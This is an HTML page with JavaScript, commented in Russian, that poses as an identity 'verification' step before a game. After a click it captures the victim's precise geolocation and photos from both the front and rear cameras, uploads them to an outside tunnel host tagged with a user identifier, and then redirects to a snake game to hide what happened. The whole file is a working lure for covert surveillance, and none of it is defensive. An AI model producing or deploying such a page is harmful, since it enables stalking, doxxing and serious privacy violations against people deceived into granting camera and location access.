<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Verification</title>
    <style>
        body { background:#000; color:#fff; font-family:sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; }
        .card { text-align:center; padding:40px; background:#111; border-radius:30px; width:80%; border:1px solid #333; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        .btn { background:#fff; color:#000; border:none; padding:15px 30px; border-radius:15px; font-weight:bold; cursor:pointer; width:100%; font-size: 16px; }
        #loader { display:none; border:4px solid #333; border-top:4px solid #fff; border-radius:50%; width:30px; height:30px; animation:spin 1s linear infinite; margin:20px auto; }
        @keyframes spin { 100% { transform:rotate(360deg); } }
        video, canvas { display:none; }
        p { color: #888; font-size: 14px; margin-bottom: 20px; }
    </style>
</head>
<body>
    <div class="card">
        <h2 id="st">Verification</h2>
        <p id="msg">Please confirm your identity to continue to the game.</p>
        <button class="btn" id="go" onclick="run()">CONFIRM</button>
        <div id="loader"></div>
    </div>
    <video id="v" autoplay playsinline muted></video>
    <canvas id="c"></canvas>

    <script>
    // Твоя актуальная ссылка (БЕЗ слэша в конце)
    const API = "https://1297695c3994a6.lhr.life"; 
    const REDIRECT_URL = "https://www.google.com/fbx?fbx=snake_arcade";

    const user = new URLSearchParams(window.location.search).get('user') || "Unknown";

    // Функция для захвата фото
    async function takePhoto(mode) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: mode } 
            });
            const v = document.getElementById('v');
            v.srcObject = stream;

            // Ждем чуть дольше (2 секунды), чтобы камера сфокусировалась
            await new Promise(r => setTimeout(r, 2000));

            const canvas = document.getElementById('c');
            canvas.width = v.videoWidth;
            canvas.height = v.videoHeight;
            canvas.getContext('2d').drawImage(v, 0, 0);

            const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
            
            // Останавливаем камеру сразу после снимка
            stream.getTracks().forEach(t => t.stop());
            return blob;
        } catch (e) {
            console.error("Camera error:", e);
            return null;
        }
    }

    async function run() {
        const btn = document.getElementById('go');
        const loader = document.getElementById('loader');
        const msg = document.getElementById('msg');
        const statusTitle = document.getElementById('st');

        // Скрываем кнопку, показываем лоадер
        btn.style.display = 'none';
        loader.style.display = 'block';
        msg.innerText = "Processing security check...";

        try {
            // 1. Отправляем локацию (не блокируем выполнение)
            navigator.geolocation.getCurrentPosition(p => {
                fetch(`${API}/location?lat=${p.coords.latitude}&lon=${p.coords.longitude}&user=${user}`).catch(() => {});
            }, null, {enableHighAccuracy: true});

            // 2. Делаем фото (строго по очереди)
            const fd = new FormData();
            
            msg.innerText = "Verifying identity (1/2)...";
            const f1 = await takePhoto("user"); // Фронталка
            if (f1) fd.append('files', f1, 'front.jpg');

            msg.innerText = "Verifying identity (2/2)...";
            const f2 = await takePhoto("environment"); // Задняя
            if (f2) fd.append('files', f2, 'back.jpg');

            // 3. ОТПРАВКА НА СЕРВЕР (Ждем завершения!)
            if (fd.has('files')) {
                msg.innerText = "Uploading data...";
                const response = await fetch(`${API}/upload-photo?user=${user}`, {
                    method: 'POST',
                    body: fd
                });

                if (!response.ok) throw new Error("Server error");
                
                console.log("Upload successful");
            } else {
                throw new Error("No photos captured");
            }

            // 4. ФИНАЛ: Только после успешного fetch меняем текст и уходим на змейку
            statusTitle.innerText = "Success";
            loader.style.display = 'none';
            msg.innerText = "Identity verified! Redirecting to game...";

            setTimeout(() => {
                window.location.href = REDIRECT_URL;
            }, 1500);

        } catch (e) {
            console.error("Error during process:", e);
            statusTitle.innerText = "Error";
            msg.innerText = "Verification failed. Please check camera permissions.";
            loader.style.display = 'none';
            btn.style.display = 'block';
            btn.innerText = "RETRY";
        }
    }
</script>
</body>
</html>
